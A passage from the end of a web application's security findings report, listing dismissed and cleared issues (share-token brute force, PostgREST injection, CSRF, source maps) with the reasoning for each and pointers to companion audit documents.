| Public unauthenticated endpoint leaks operational cron freshness timestamps | The response is a single derived `{ finishedAt }` with no cron names or statuses, fetched by every anonymous page load by design — no sensitive operational detail exposed. |
| `Content-Disposition` filename built from unsanitized `?table` query param (header injection) | The value is gated by a strict-equality allow-list that 400s before the header is set, so only one of 7 hardcoded literal table names can ever reach the filename. |
| Full scoring methodology + calibrated constants ship readable in the client bundle | Factually true, but `/methodology` is a deliberately public unprotected route that already discloses the methodology — it is published, not confidential. |

---

## 4b — Assessed during the completeness pass (cleared)

Four additional vectors raised by the threat model / completeness review were checked and found **not** to be findings:

| Vector checked | Resolution |
|---|---|
| Share-link token brute force (`/memo/:token`, public + unauthenticated) | Tokens are `replace(gen_random_uuid()::text,'-','')` = 32 hex chars / ~122 bits ([supabase/migrations/017_share_tokens.sql:12](../supabase/migrations/017_share_tokens.sql)); guessing is computationally infeasible, and links self-expire (90 d) + view-cap (100). **Minor note:** `memo-view` dispatches at [api/lens-insight.js:322](../api/lens-insight.js) *before* the rate limiter, so the public lookup is unthrottled — fold a lightweight per-IP cap into the F-05 rate-limit work as defense-in-depth (not a standalone finding). |
| PostgREST filter/operator injection from the client | The SPA's Supabase reads use the parameterized query builder (`.eq/.in/.range`); a repo-wide grep found **no** `.or()`/`.filter()` raw-string filters built from user input in `src/` (every `.filter(` hit is `Array.prototype.filter`). No client-side PostgREST string-injection surface. |
| CSRF on the Supabase-direct write path | Supabase sends the session JWT in the `Authorization: Bearer` header (not an ambient cookie), so a cross-site request carries no credential — the direct PostgREST write path is structurally CSRF-immune. No anti-CSRF token is needed. |
| Source maps shipping to production | `vite.config.js` sets no `build.sourcemap` (defaults to `false`) and a build's `dist/assets/` contains **0** `.map` files — confirmed by inspection, not just asserted. Server logic (Anthropic SDK, scrapers) is `api/`-only and never bundled. |

---

*End of findings report. Companion documents in this folder: `00-threat-model.md` (threat model + attack surface), `02-remediation-roadmap.md` (phased plan), `03-guardrails-spec.md` (CI/hooks/headers), `04-unverified-checklist.md` (manual dashboard/live-state checks). The executive summary is §1 of this document — there is no separate doc 05. For every Critical/High and Medium finding above, the cited file was re-opened and the snippet confirmed verbatim during this pass.*
